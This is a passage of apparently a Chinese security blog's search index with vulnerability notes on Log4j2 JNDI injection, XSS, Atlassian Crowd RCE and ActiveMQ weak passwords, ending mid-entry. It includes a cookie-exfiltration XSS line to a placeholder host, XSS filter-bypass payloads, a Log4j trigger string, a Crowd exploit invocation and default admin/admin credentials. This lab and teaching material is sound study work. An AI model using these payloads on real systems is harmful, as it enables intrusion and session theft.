<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache Log4j2 远程代码执行漏洞 - CVE-2021-44228</title>
    <url>//5dc390d54be4.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。</p>
<h2 id="Java-日志体系"><a href="#Java-日志体系" class="headerlink" title="Java 日志体系"></a>Java 日志体系</h2><p>在 2001 年之前，Java不存在日志库，打印日志均通过 <code>system.out</code> 和 <code>system.err</code></p>
<p>该方式有以下缺点：</p>
<ul>
<li>  大量 IO 操作</li>
<li>  无法合理控制输出，并且输出内容不能保存</li>
<li>  无法定制日志格式</li>
</ul>
<p>在 2001 年，软件开发者 Ceki Gulcu 设计出了一套日志库为<code>Log4j</code>，并且该项目加入Apache</p>
<p>为了方便开发者选择使用，Apache 推出了日志门面 JCL （Jakarta Commons Logging），它提供了一个日志抽象层，在运行时动态的绑定日志来实现组件来工作（如Log4j，java.util.logging）。导入哪个就绑定哪个，不需要再修改配置。如果没有导入的话内部有一个Simple logger的简单实现，但是功能很弱，直接忽略。</p>
<p>在 2006 年，Log4j 的作者 Ceki Gulcu 离开了 Apache 后，开发了另一套日志库 Slf4j（Simple Logging Facade for Java）。Slf4j 需要桥接包来和日志实现组件建立关系，由于每次使用都需要配合桥接包。作者又开发出了 Logback 日志标准库作为 Slf4j 接口的默认实现。</p>
<p>在 2012 年，Apache 推出了新的日志库 <code>Log4j2</code>，并且不兼容 Log4j</p>
<p>Log4j2 具有 Logback 的所有特性，并且做了分离设计，分为 <code>log4j-api</code> 和 <code>log4j-core</code></p>
<p>log4j-api 是日志接口</p>
<p>log4j-core 是日志标准库</p>
<p>除此之外 Apache 还为 Log4j2 提供了各种桥接包</p>
<p>从此 Log4j2 便成为各种 JAVA 程序的默认日志实现</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为</p>
<p>攻击者使用 <code>$&#123;&#125;</code> 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
<p>由于其触发方式简单、使用范围广泛，因此漏洞危害极大。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Log4j2  &gt; 2.0</p>
<p>Apache Log4j2 &lt; 2.14.1</p>
<p>在 Java 相关应用中有数万个开源软件使用 Apache Log4j2，影响范围极大，几乎涉及到所有的Java应用</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>Log4j2 下载地址：<a href="https://logging.apache.org/log4j/2.x/download.html">https://logging.apache.org/log4j/2.x/download.html</a></p>
<p>然后在项目中添加依赖</p>
<p>使用 maven 来引入 Log4j2 组件的 2.14.0 版本，在工程目录的 pom.xml 下添加如下配置，会导入两个jar包</p>
<blockquote>
<p>  org.apache.logging.log4j:log4j-api:2.14.0</p>
<p>  org.apache.logging.log4j:log4j-core:2.14.0</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在工程目录 resources 下创建 log4j2.xml 配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appenders</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> &gt;</span></span><br><span class="line"><span class="comment">&lt;!--            配置Console的模式布局--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置日志级别--&gt;</span>     </span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>log4j2 支持多种日志级别，通过日志级别可以对日志信息分类，在合适的地方输出日志，日志级别分为六个级别，还定义了内置的标准级别 intLevel，由数值表示，级别越高数值越小</p>
<table>
<thead>
<tr>
<th align="center">日志级别</th>
<th align="center">intLevel</th>
</tr>
</thead>
<tbody><tr>
<td align="center">OFF</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">FATAL（致命的）</td>
<td align="center">100</td>
</tr>
<tr>
<td align="center">ERROR</td>
<td align="center">200</td>
</tr>
<tr>
<td align="center">WARN</td>
<td align="center">300</td>
</tr>
<tr>
<td align="center">INFO</td>
<td align="center">400</td>
</tr>
<tr>
<td align="center">DEBUG</td>
<td align="center">500</td>
</tr>
<tr>
<td align="center">TRACE（堆栈）</td>
<td align="center">600</td>
</tr>
<tr>
<td align="center">ALL</td>
<td align="center">integer.MAX_VALUE</td>
</tr>
</tbody></table>
<p>搭建代码环境</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j2Rce2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j2Rce2.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;java:os&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>触发漏洞语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://58bafab2.check.dns1.top&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>java 应用存在如下组件</p>
<ul>
<li>  log4j-api</li>
<li>  log4j-core</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2>]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>Apache</category>
        <category>Log4j2</category>
        <category>远程代码执行漏洞</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-跨站脚本漏洞</title>
    <url>//f6a9bc23287a.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>跨站脚本攻击-XSS（Cross Site Script），为不和层叠样式表（Cascading Style Sheets,CSS）的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
<p>是指攻击者通过Web页面中写入恶意JavaScript代码，造成用户在浏览页面时，嵌入其中的JavaScript代码会被执行，导致控制用户浏览器进行操作的攻击方式。</p>
<p><strong>XSS 的危害</strong></p>
<ul>
<li>  盗取 Cookie</li>
<li>  流量劫持</li>
<li>  网络钓鱼</li>
<li>  篡改页面信息</li>
<li>  获取信息</li>
<li>  恶意弹框</li>
<li>  配合CSRF进行蠕虫攻击</li>
</ul>
<h2 id="XSS-漏洞分类"><a href="#XSS-漏洞分类" class="headerlink" title="XSS 漏洞分类"></a>XSS 漏洞分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链接发送给目标，诱导目标访问该链接，造成用户向目标服务器发起GET请求</p>
<p>整个过程中，服务端只是接受数据然后处理，返回数据到浏览器，服务器并不储存XSS代码</p>
<h3 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h3><p>持久型，当攻击者提交一段XSS代码后，被服务器接收并储存，当访客访问这个页面时，这段代码被程序运行响应给浏览器，造成XSS攻击。</p>
<p>常见的地方就是在博客留言板，反馈投诉，论坛文章、评论等，将恶意代码和正常的提交都保存在数据库，每次访问都会触发该代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;srcipt&gt;alert(<span class="regexp">/xss/</span>)&lt;/srcipt&gt;</span><br></pre></td></tr></table></figure>



<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM型是特殊的反射型XSS，在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document Object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性，方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。</p>
<p>也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行，从而造成XSS漏洞的利用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);img.src=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>代码中没有对用户的输入进行任何过滤，导致用户输入的字符串被当作代码执行</p>
<p>如以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">	&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;text&quot; name=&quot;input&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">	&lt;?php</span><br><span class="line">		$Xss = $_GET[&#x27;input&#x27;];</span><br><span class="line">		echo &#x27;output:&lt;br&gt;&#x27;.$Xss;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>在上述代码中我们可以看到，用户所有的输入通过HTTP GET方法的预定义变量<code>$_GET[]</code>传入到变量<code>$Xss</code>中，又被<code>echo()</code>函数直接输出，这其中代码没有对用户的输入进行任何的过滤</p>
<p>如果我们在输入中添加 JavaScript 代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>那么代码中的语句就会变成下面这个样子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;output:&lt;br&gt;&#x27;.&#x27;&lt;script&gt;alert(/xss/)&lt;/script&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>在网页中是以这样显示的，<code>&lt;script&gt;</code>被当作了元素块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ouput:&lt;br&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>虽然在代码中这只是一个保存在变量<code>$Xss</code>中的一串字符串</p>
<p>但是当代码通过浏览器显示出来，会被浏览器识别，当作<code>JavaScript</code>语句执行，如下所示</p>
<p><img src="https://i.loli.net/2021/11/24/LyqlTIZJhnrVXpC.png"></p>
<h2 id="测试-XSS-语句"><a href="#测试-XSS-语句" class="headerlink" title="测试 XSS 语句"></a>测试 XSS 语句</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href = javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>所有用户控制输入的地方</p>
<ul>
<li><p>  URL</p>
</li>
<li><p>  论坛</p>
</li>
<li><p>  评论</p>
</li>
<li><p>  文章发布</p>
</li>
<li><p>  搜索框</p>
</li>
<li><p>  表单提交</p>
</li>
<li><p>  反馈</p>
</li>
<li><p>HTTP参数</p>
<p>  。。。</p>
</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>反弹cookie</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">##</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="XSS-漏洞绕过"><a href="#XSS-漏洞绕过" class="headerlink" title="XSS 漏洞绕过"></a>XSS 漏洞绕过</h2><h3 id="XSS-关键字变型"><a href="#XSS-关键字变型" class="headerlink" title="XSS 关键字变型"></a>XSS 关键字变型</h3><p><strong>大小写转换</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 只对标签有效,对JavaScript的对象无效</span><br><span class="line"># 初始语句</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 大写转换</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;JAVASCRIPT:alert(1);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 大小写混淆</span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">sRc</span>=<span class="string">&quot;JaVaScRipt:alert(1);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>空格回车TAB绕过</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#　TAB绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javas		cript:alert(1);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#　回车绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javas</span></span></span><br><span class="line"><span class="string"><span class="tag">cript:</span></span></span><br><span class="line"><span class="string"><span class="tag">alert(1);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>不使用空格,引号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img/src=javascript:alert(1);&gt;</span><br></pre></td></tr></table></figure>

<p><strong>利用注释符</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;left:expre/**/ssion(alert(/xss/));&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="XSS-关键字编码"><a href="#XSS-关键字编码" class="headerlink" title="XSS 关键字编码"></a>XSS 关键字编码</h3><h4 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h4><p>URL编码也叫做Escape编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 原语句</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># Escape编码</span><br><span class="line">%3Cscript%3Ealert%28/xss/%29%3C/script%3E</span><br></pre></td></tr></table></figure>

<h4 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h4><p>HTML实体编码其实就是ASCII编码</p>
<p>编码以<code>&amp;</code>开头，以<code>;</code>结尾</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 原语句</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 通过函数eval()</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 把符号转换为实体名称</span><br><span class="line"><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(/xss/)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"># 把所有字符转换为实体编号</span><br><span class="line"><span class="symbol">&amp;#60;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#62;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#60;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#62;</span></span><br><span class="line"></span><br><span class="line"># 把所有字符转换为16进制的实体编号</span><br><span class="line"><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3E;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3E;</span></span><br></pre></td></tr></table></figure>

<h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><p>只能以命令执行的方式绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 原语句</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Unicode编码,需要通过eval()函数执行语句</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">u0061</span>\<span class="attr">u006c</span>\<span class="attr">u0065</span>\<span class="attr">u0072</span>\<span class="attr">u0074</span>\<span class="attr">u0028</span>\<span class="attr">u0031</span>\<span class="attr">u0029</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul>
<li>对输入的数据进行实例化<ul>
<li>  PHP-htmlspecialchars 函数</li>
</ul>
</li>
<li>  对特定字符做编码转换</li>
<li>  过滤符号<code>&lt;&gt;</code>，<code>&#39;&#39;</code>，<code>&quot;&quot;</code>，<code>&amp;</code>，<code>\</code>，<code>#</code>，<code>%</code></li>
</ul>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Atlassian Crowd 未授权访问漏洞 - CVE-2019-11580</title>
    <url>//a5e49e0e2f90.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​        Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为用用户、网络应用程序和目录服务器提供验证、授权等功能</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​        Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了了pdkinstall开发插件,使其存在安全漏漏洞洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件,执行任意代码/命令,从而获得服务器权限</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Atlassian Crowd = 2.1.x </p>
<p>Atlassian Crowd = 3.0.x ~3.0.4</p>
<p>Atlassian Crowd = 3.1.x ~ 3.1.5</p>
<p>Atlassian Crowd = 3.2.x ~ 3.2.7</p>
<p>Atlassian Crowd = 3.3.x ~ 3.3.4</p>
<p>Atlassian Crowd = 3.4.x ~ 3.4.3</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>需要Java环境</p>
<p>下载地址：<a href="https://www.atlassian.com/zh/software/crowd/download-archive">https://www.atlassian.com/zh/software/crowd/download-archive</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建账号</span></span><br><span class="line">useradd crowd</span><br><span class="line">passwd crowd</span><br><span class="line">su - crowd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载</span></span><br><span class="line">wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-4.4.0.zip</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar -zxvf atlassian-crowd-4.4.0.zip</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置 crowd.home</span></span><br><span class="line">vim atlassian-crowd-4.4.0/crowd-webapp/WEB-INF/classes/crowd-init.properties</span><br><span class="line">crowd.home=/home/crowd/atlassian-crowd-4.4.0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加载 Mysql jdbc 驱动</span></span><br><span class="line">cp mysql-connector-java-5.1.46.jar /home/crowd/atlassian-crowd-4.4.0/apache-tomcat/lib</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 crowd</span></span><br><span class="line">sh /home/crowd/atlassian-crowd-4.4.0/start_crowd.sh</span><br></pre></td></tr></table></figure>

<p>访问页面，输入License</p>
<p><a href="http://127.0.0.1:8095/">http://127.0.0.1:8095</a></p>
<p>选择导入备份，设置数据库信息，设置参数，设置管理员账号等</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：8095</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载POC：<a href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-11580.py http://127.0.0.1:8095</span><br></pre></td></tr></table></figure>
<p>通过修改cmd后面参数，可以任意执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8095/crowd/plugins/servlet/exp?cmd=ifconfig</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>设置访问<code>/crowd/admin/uploadplugin.action</code>的源ip</li>
<li>升级 Atlassian Crowd 为最新版本</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>常规漏洞</category>
        <category>Atlassian Crowd</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache ActiveMQ 未授权访问&amp;弱口令漏洞</title>
    <url>//209eabddaf61.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ActiveMQ 是 Apache 研发的开源消息服务器，它支持Java消息服务、集群、Spring Framework等。</p>
<p>ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现</p>
<p>随着中间件的启动，会打开两个端口，61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口</p>
<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver</p>
<p>其中admin是管理员页面，api是接口，fileserver是储存文件的接口。</p>
<p>admin和api都需要登录后才能访问，fileserver无需登录</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Apache ActiveMQ 全版本</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>下载地址：<a href="http://activemq.apache.org/components/classic/download/">http://activemq.apache.org/components/classic/download/</a></p>
<p>解压文件夹</p>
<p>启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ActiveMQ/bin/ActiveMQ.bat</span><br><span class="line"></span><br><span class="line">cd ActiveMQ/bin/</span><br><span class="line">./ActiveMQ start</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：61616（工作端口），8161（Web端口）</p>
<p>Apache ActiveMQ 在默认情况下，未做安全配置，没有登录验证，导致可以未授权访问</p>
<p>存在弱口令账号密码 admin/admin</p>
